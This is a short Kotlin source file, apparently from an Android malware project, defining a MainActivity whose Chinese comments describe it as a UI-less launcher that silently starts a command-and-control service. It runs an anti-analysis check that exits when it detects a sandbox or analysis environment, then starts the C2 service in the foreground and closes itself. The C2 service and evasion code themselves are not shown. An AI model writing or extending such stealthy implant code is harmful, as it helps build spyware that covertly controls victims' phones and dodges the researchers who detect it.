package com.cc.mumac2

import android.content.Intent
import android.os.Build
import android.os.Bundle
import androidx.activity.ComponentActivity

/** 主Activity - 无界面，静默启动C2服务 */
class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // 反检测：若检测到分析环境则立即退出
        EvasionCheck.exitIfAnalyzed()
        // 启动前台服务
        val intent = Intent(this, C2Service::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
        finish()
    }
}
